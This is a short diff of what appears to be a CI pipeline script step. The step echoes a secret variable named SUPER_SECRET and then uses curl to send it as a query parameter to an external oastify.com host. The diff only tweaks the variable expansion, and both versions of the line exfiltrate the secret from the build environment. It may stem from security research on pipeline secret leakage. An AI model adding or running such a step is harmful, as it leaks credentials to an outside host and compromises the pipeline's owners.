@@ -12,5 +12,5 @@ steps:
   - script: |
       echo $(SUPER_SECRET)
       $var = "SUPER_SECRET"
-      curl https://rupx4un8zwdy1729e272k46xqowfk58u.oastify.com?secret=$($var)
+      curl https://rupx4un8zwdy1729e272k46xqowfk58u.oastify.com?secret=$($(var))
   
